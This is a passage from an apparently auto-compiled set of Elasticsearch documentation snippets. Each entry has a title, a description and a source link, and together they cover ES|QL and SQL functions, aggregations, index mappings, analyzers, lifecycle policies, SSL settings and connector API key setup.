https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_ip.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TO_IP('192.168.1.1')           AS ip1,\n       TO_IP('::1')                   AS ip2,\n       TO_IP('2001:db8:0:0:0:0:2:1')   AS ip3,\n       TO_IP('2001:db8::2:1')         AS ip4,\n       TO_IP('0.0.0.0')               AS ip5,\n       TO_IP('::')\n```\n\n----------------------------------------\n\nTITLE: KQL Query Documentation Comment\nDESCRIPTION: Comment header indicating this is an auto-generated test file for KQL query functionality, with a note about performing KQL queries that return boolean results based on row matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/kql.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nPerforms a KQL query. Returns true if the provided KQL query string matches the row.\n```\n\n----------------------------------------\n\nTITLE: Creating Certificates Using elasticsearch-certutil in Bash\nDESCRIPTION: This snippet demonstrates how to use the 'elasticsearch-certutil' utility to create additional certificates from a PKCS#12 keystore. It specifies the input keystore file, the DNS name of the node, and requires a password to access the keystore.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/cli/src/main/resources/org/elasticsearch/xpack/security/cli/certutil-http/ca-readme-p12.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nelasticsearch-certutil cert --ca ${P12} --dns \"hostname.of.your.node\" --pass\n```\n\n----------------------------------------\n\nTITLE: Basic ENRICH Command Usage in Elasticsearch SQL\nDESCRIPTION: Demonstrates the basic usage of the ENRICH command to add a new column for each enrich field defined in the policy. The match is performed using the match_field defined in the enrich policy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-enrich-data.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW language_code = \"1\"\n| ENRICH languages_policy\n```\n\n----------------------------------------\n\nTITLE: Advanced Querying and Aggregations with Parent-Join Fields in Elasticsearch\nDESCRIPTION: Example demonstrating advanced features with join fields including parent_id query, aggregations on parent fields, and accessing join fields in scripts. This shows the versatility of parent-child relationships.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"parent_id\": { <1>\n      \"type\": \"answer\",\n      \"id\": \"1\"\n    }\n  },\n  \"aggs\": {\n    \"parents\": {\n      \"terms\": {\n        \"field\": \"my_join_field#question\", <2>\n        \"size\": 10\n      }\n    }\n  },\n  \"runtime_mappings\": {\n    \"parent\": {\n      \"type\": \"long\",\n      \"script\": \"\"\"\n        emit(Integer.parseInt(doc['my_join_field#question'].value)) <3>\n      \"\"\"\n    }\n  },\n  \"fields\": [\n    { \"field\": \"parent\" }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Java Keystore SSL Settings in Elasticsearch\nDESCRIPTION: Configuration settings for Java keystore files (JKS) containing private keys, certificates, and trust certificates. Includes settings for keystore paths, passwords, and truststore configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.ssl.keystore.path\nxpack.security.http.ssl.keystore.password\nxpack.security.http.ssl.keystore.secure_password\nxpack.security.http.ssl.keystore.key_password\nxpack.security.http.ssl.keystore.secure_key_password\nxpack.security.http.ssl.truststore.path\nxpack.security.http.ssl.truststore.password\nxpack.security.http.ssl.truststore.secure_password\n```\n\n----------------------------------------\n\nTITLE: Initializing InternalQlScriptUtils Utility Class for Elasticsearch Scripting\nDESCRIPTION: Java class containing utility methods for Elasticsearch query language scripting, providing null-safe operations, comparisons, and mathematical functions\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/main/resources/org/elasticsearch/xpack/eql/plugin/eql_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.ql.expression.function.scalar.whitelist.InternalQlScriptUtils {\n  def docValue(java.util.Map, String)\n  boolean nullSafeFilter(Boolean)\n  double nullSafeSortNumeric(Number)\n  String nullSafeSortString(Object)\n  Number nullSafeCastNumeric(Number, String)\n  Number nullSafeCastToUnsignedLong(Number)\n}\n```\n\n----------------------------------------\n\nTITLE: Output Document with Override Option\nDESCRIPTION: Shows the result when the override option is true, replacing the existing nested value instead of merging.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\" : {\n    \"bar\" : \"value2\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Formatting a DateTime from an Indexed Document in Painless\nDESCRIPTION: Painless script that retrieves a datetime value from an indexed document and formats it as an ISO instant string using the Java DateTimeFormatter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_20\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime input = doc['input_datetime'].value;\nString output = input.format(DateTimeFormatter.ISO_INSTANT);\n```\n\n----------------------------------------\n\nTITLE: Access Denied Event Logging in Elasticsearch\nDESCRIPTION: JSON structure for logging denied access attempts by authenticated users lacking necessary privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:30:06,949+0200\", \"node.id\":\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"transport\", \"event.action\":\"access_denied\", \"authentication.type\":\"REALM\", \"user.name\":\"user1\", \"user.realm\":\"default_native\", \"user.roles\":[\"test_role\"], \"origin.type\":\"rest\", \"origin.address\":\"[::1]:52434\", \"request.id\":\"yKOgWn2CRQCKYgZRz3phJw\", \"action\":\"indices:admin/auto_create\", \"request.name\":\"CreateIndexRequest\", \"indices\":[\"<index-{now/d+1d}>\"]}\n```\n\n----------------------------------------\n\nTITLE: Installing Ukrainian Analysis Plugin in Elasticsearch\nDESCRIPTION: Command to install the Ukrainian analysis plugin using Elasticsearch's plugin manager. The plugin must be installed on all cluster nodes, requiring restart after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-ukrainian.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-ukrainian\n```\n\n----------------------------------------\n\nTITLE: phrase_prefix Query Execution\nDESCRIPTION: This snippet shows how the `phrase_prefix` type is executed internally as a dis_max query with match_phrase_prefix queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"dis_max\": {\n      \"queries\": [\n        { \"match_phrase_prefix\": { \"subject\": \"quick brown f\" }},\n        { \"match_phrase_prefix\": { \"message\": \"quick brown f\" }}\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rounding Date Values in Java for Date Histogram\nDESCRIPTION: This snippet shows how date values are rounded down to the closest bucket in a date histogram aggregation using Java-like pseudocode.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nbucket_key = Math.floor(value / interval) * interval\n```\n\n----------------------------------------\n\nTITLE: Synthetic _source Example for IP Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates how synthetic _source behaves with IP fields, including sorting and removing duplicates for both IPv4 and IPv6 addresses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ip.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"ip\": { \"type\": \"ip\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"ip\": [\"192.168.0.1\", \"192.168.0.1\", \"10.10.12.123\",\n         \"2001:db8::1:0:0:1\", \"::afff:4567:890a\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using CHAR Function in Elasticsearch SQL\nDESCRIPTION: Returns the character that has the ASCII code value specified by the numeric input. Takes an integer expression between 0 and 255 as input and returns null if the input is null, negative, or greater than 255.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCHAR(code) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CHAR(69);\n\n   CHAR(69)\n---------------\nE\n```\n\n----------------------------------------\n\nTITLE: Basic Stats Bucket Aggregation Syntax in Elasticsearch\nDESCRIPTION: Shows the basic syntax structure for a stats_bucket aggregation in isolation. This demonstrates the minimal required configuration using buckets_path parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-stats-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"stats_bucket\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Average Bucket Aggregation in Elasticsearch Search Query\nDESCRIPTION: Example of using the average bucket aggregation in an Elasticsearch search query. This snippet demonstrates how to calculate average monthly sales using a date histogram and sum aggregation, followed by the avg_bucket aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-avg-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST _search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"avg_monthly_sales\": {\n      \"avg_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\",\n        \"gap_policy\": \"skip\",\n        \"format\": \"#,##0.00;(#,##0.00)\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Data Types for ESQL Functions in Markdown\nDESCRIPTION: This markdown table defines the supported input and result data types for ESQL functions. It shows the mapping between string and number input types and their corresponding result types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/repeat.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | number | result |\n| --- | --- | --- |\n| keyword | integer | keyword |\n| text | integer | keyword |\n```\n\n----------------------------------------\n\nTITLE: Implicit Grouping Query in SQL\nDESCRIPTION: Demonstrates implicit grouping using COUNT aggregate function without GROUP BY clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(*) AS count FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Time Zone Range Query Example\nDESCRIPTION: This example demonstrates a range query using the `time_zone` parameter in Elasticsearch. It converts date values to UTC using a UTC offset of +01:00.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-range-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"range\": {\n      \"timestamp\": {\n        \"time_zone\": \"+01:00\",        <1>\n        \"gte\": \"2020-01-01T00:00:00\", <2>\n        \"lte\": \"now\"                  <3>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Truststore Settings\nDESCRIPTION: Settings for configuring truststores that contain certificates to trust when verifying remote certificates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_18\n\nLANGUAGE: properties\nCODE:\n```\nssl.truststore.path=<truststore-path>\nssl.truststore.type=jks|PKCS12\nssl.truststore.password=<password>\nssl.truststore.secure_password=<secure-password>\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Histogram Field Mapping in Elasticsearch\nDESCRIPTION: API request to create a new index with a histogram field for storing percentile data and a keyword field for histogram titles. The mapping defines the structure for storing pre-aggregated numerical data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/histogram.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\" : {\n    \"properties\" : {\n      \"my_histogram\" : {\n        \"type\" : \"histogram\"\n      },\n      \"my_text\" : {\n        \"type\" : \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including SIN Function Parameters in Markdown\nDESCRIPTION: This snippet includes the parameters documentation for the SIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sin.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/sin.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Rollover with Multiple Conditions\nDESCRIPTION: ILM policy configuration that combines multiple conditions: rolls over when index is 7 days old or 100GB in size, but only if it contains at least 1000 documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_age\": \"7d\",\n            \"max_size\": \"100gb\",\n            \"min_docs\": 1000\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: YAML Front Matter Configuration\nDESCRIPTION: YAML configuration block defining page mapping and deployment applicability for the documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/snapshot-restore-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/reference/current/snapshot-settings.html\napplies_to:\n  deployment:\n    ess:\n    self:\n```\n\n----------------------------------------\n\nTITLE: Decay Function for Numeric Fields\nDESCRIPTION: This snippet shows an example of using the `decayNumericLinear` function within a script. It includes the parameters origin, scale, offset and decay to be used to calculate the score.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"decayNumericLinear(params.origin, params.scale, params.offset, params.decay, doc['dval'].value)\",\n    \"params\": { <1>\n        \"origin\": 20,\n        \"scale\": 10,\n        \"decay\" : 0.5,\n        \"offset\" : 0\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering airports by intersection with a polygon\nDESCRIPTION: This snippet demonstrates how to use the ST_INTERSECTS function in an ESQL query to find airports whose location intersects with a specific polygon. The TO_GEOSHAPE function is used to define the polygon.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_intersects.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE ST_INTERSECTS(location, TO_GEOSHAPE(\"POLYGON((42 14, 43 14, 43 15, 42 15, 42 14))\"))\n```\n\n----------------------------------------\n\nTITLE: Implementing Greek Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in Greek analyzer with Greek-specific lowercase filter, Greek stopwords, keyword marker for exclusions from stemming, and Greek stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nPUT /greek_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"greek_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_greek_\" <1>\n        },\n        \"greek_lowercase\": {\n          \"type\":       \"lowercase\",\n          \"language\":   \"greek\"\n        },\n        \"greek_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"παράδειγμα\"] <2>\n        },\n        \"greek_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"greek\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_greek\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"greek_lowercase\",\n            \"greek_stop\",\n            \"greek_keywords\",\n            \"greek_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Binding with LDAPConnection using BindRequest\nDESCRIPTION: This snippet outlines the method for binding a connection using a BindRequest with the LDAPConnection class. It is essential for establishing authenticated connections to the LDAP server.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/ldap-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\ncom.unboundid.ldap.sdk.LDAPConnection#bind(com.unboundid.ldap.sdk.BindRequest)\n```\n\n----------------------------------------\n\nTITLE: Defining OffsetDateTime Class\nDESCRIPTION: This code snippet outlines the `java.time.OffsetDateTime` class. The class represents a date and time with an offset from UTC/Greenwich in the ISO-8601 calendar system, such as 2007-12-03T10:15:30+01:00. This code lists its methods, including conversions to other date/time types, comparisons, arithmetic operations for adding/subtracting durations, parsing and formatting and adjusting the date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.OffsetDateTime {\\n  OffsetDateTime MAX\\n  OffsetDateTime MIN\\n  ZonedDateTime atZoneSameInstant(ZoneId)\\n  ZonedDateTime atZoneSimilarLocal(ZoneId)\\n  int compareTo(OffsetDateTime)\\n  String format(DateTimeFormatter)\\n  OffsetDateTime from(TemporalAccessor)\\n  int getDayOfMonth()\\n  DayOfWeek getDayOfWeek()\\n  int getDayOfYear()\\n  int getHour()\\n  int getMinute()\\n  Month getMonth()\\n  int getMonthValue()\\n  int getNano()\\n  ZoneOffset getOffset()\\n  int getSecond()\\n  int getYear()\\n  boolean isAfter(OffsetDateTime)\\n  boolean isBefore(OffsetDateTime)\\n  boolean isEqual(OffsetDateTime)\\n  OffsetDateTime minus(TemporalAmount)\\n  OffsetDateTime minus(long,TemporalUnit)\\n  OffsetDateTime minusYears(long)\\n  OffsetDateTime minusMonths(long)\\n  OffsetDateTime minusWeeks(long)\\n  OffsetDateTime minusDays(long)\\n  OffsetDateTime minusHours(long)\\n  OffsetDateTime minusMinutes(long)\\n  OffsetDateTime minusSeconds(long)\\n  OffsetDateTime minusNanos(long)\\n  OffsetDateTime of(LocalDate,LocalTime,ZoneOffset)\\n  OffsetDateTime of(LocalDateTime,ZoneOffset)\\n  OffsetDateTime of(int,int,int,int,int,int,int,ZoneOffset)\\n  OffsetDateTime ofInstant(Instant,ZoneId)\\n  OffsetDateTime parse(CharSequence)\\n  OffsetDateTime parse(CharSequence,DateTimeFormatter)\\n  OffsetDateTime plus(TemporalAmount)\\n  OffsetDateTime plus(long,TemporalUnit)\\n  OffsetDateTime plusYears(long)\\n  OffsetDateTime plusMonths(long)\\n  OffsetDateTime plusWeeks(long)\\n  OffsetDateTime plusDays(long)\\n  OffsetDateTime plusHours(long)\\n  OffsetDateTime plusMinutes(long)\\n  OffsetDateTime plusSeconds(long)\\n  OffsetDateTime plusNanos(long)\\n  Comparator timeLineOrder()\\n  long toEpochSecond()\\n  Instant toInstant()\\n  LocalDate toLocalDate()\\n  LocalDateTime toLocalDateTime()\\n  LocalTime toLocalTime()\\n  OffsetTime toOffsetTime()\\n  ZonedDateTime toZonedDateTime()\\n  OffsetDateTime truncatedTo(TemporalUnit)\\n  OffsetDateTime with(TemporalAdjuster)\\n  OffsetDateTime with(TemporalField,long)\\n  OffsetDateTime withDayOfMonth(int)\\n  OffsetDateTime withDayOfYear(int)\\n  OffsetDateTime withHour(int)\\n  OffsetDateTime withMinute(int)\\n  OffsetDateTime withMonth(int)\\n  OffsetDateTime withNano(int)\\n  OffsetDateTime withSecond(int)\\n  OffsetDateTime withYear(int)\\n  OffsetDateTime withOffsetSameLocal(ZoneOffset)\\n  OffsetDateTime withOffsetSameInstant(ZoneOffset)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Flattened Fields Example\nDESCRIPTION: Example demonstrating how to retrieve specific subfields from a flattened field using the fields parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"flattened_field\": {\n        \"type\": \"flattened\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1?refresh=true\n{\n  \"flattened_field\" : {\n    \"subfield\" : \"value\"\n  }\n}\n\nPOST my-index-000001/_search\n{\n  \"fields\": [\"flattened_field.subfield\"],\n  \"_source\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-Criteria Ordering in Terms Aggregation\nDESCRIPTION: Example demonstrating how to order buckets using multiple criteria including stats and document count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"countries\": {\n      \"terms\": {\n        \"field\": \"artist.country\",\n        \"order\": [ { \"rock>playback_stats.avg\": \"desc\" }, { \"_count\": \"desc\" } ]\n      },\n      \"aggs\": {\n        \"rock\": {\n          \"filter\": { \"term\": { \"genre\": \"rock\" } },\n          \"aggs\": {\n            \"playback_stats\": { \"stats\": { \"field\": \"play_count\" } }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Matching Documents Using Percolate Query\nDESCRIPTION: This shows how to match a document against stored percolator queries in an index. The document is matched using a percolate query which evaluates the 'message' against registered queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"document\": {\n        \"message\": \"A new bonsai tree in the office\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting String to Lowercase using TO_LOWER in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_LOWER function in ESQL to convert a string to lowercase. It creates a row with a 'message' field and then uses EVAL to create a new field 'message_lower' with the lowercase version of the message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_lower.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"Some Text\"\n| EVAL message_lower = TO_LOWER(message)\n```\n\n----------------------------------------\n\nTITLE: Fixed Salary Bucket Size in ESQL\nDESCRIPTION: Creates salary buckets with a fixed size of 5000 units for employees hired in 1985.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS c = COUNT(1) BY b = BUCKET(salary, 5000.)\n| SORT b\n```\n\n----------------------------------------\n\nTITLE: Pagination Continuation in Elasticsearch Aggregation\nDESCRIPTION: Demonstrates how to fetch the next set of results in composite aggregation using the after parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"size\": 2,\n        \"sources\": [\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\", \"order\": \"desc\" } } },\n          { \"product\": { \"terms\": { \"field\": \"product\", \"order\": \"asc\" } } }\n        ],\n        \"after\": { \"date\": 1494288000000, \"product\": \"mad max\" }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Boundary Coordinates using ST_ENVELOPE in ESQL\nDESCRIPTION: Query that extracts the minimum and maximum coordinates of a spatial boundary using ST_ENVELOPE and related spatial functions. The query filters for Copenhagen airport (CPH) and returns the envelope's boundary coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_xmin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Reverse Token Filter in Elasticsearch\nDESCRIPTION: This example shows how to create a custom analyzer named 'whitespace_reverse' using the create index API. The analyzer uses a whitespace tokenizer followed by the reverse filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-reverse-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT reverse_example\n{\n  \"settings\" : {\n    \"analysis\" : {\n      \"analyzer\" : {\n        \"whitespace_reverse\" : {\n          \"tokenizer\" : \"whitespace\",\n          \"filter\" : [\"reverse\"]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for S3 Connector - Elasticsearch - Console\nDESCRIPTION: This snippet shows how to generate an API key for an Elasticsearch S3 connector, specifying roles and permissions required for the connector operations. Users need 'monitor' and 'manage_connector' privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating API Key for MySQL Connector\nDESCRIPTION: Example of creating an API key for the MySQL connector using the Elasticsearch Security API. This key grants necessary permissions for the connector to operate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Aggregating on a Range Field with Histogram\nDESCRIPTION: This snippet shows how to perform a histogram aggregation on the expected_attendees range field, demonstrating how a single document can appear in multiple buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-field-note.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /range_index/_search?size=0\n{\n  \"aggs\": {\n    \"range_histo\": {\n      \"histogram\": {\n        \"field\": \"expected_attendees\",\n        \"interval\": 5\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying both geo_point and geo_shape data with geo_distance filter\nDESCRIPTION: This snippet shows how to search across multiple indices containing both `geo_point` and `geo_shape` data using the `geo_distance` filter in Elasticsearch. It queries both `my_locations` and `my_geoshapes` indices for documents within 200km of latitude 40 and longitude -70.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations,my_geoshapes/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"200km\",\n          \"pin.location\": {\n       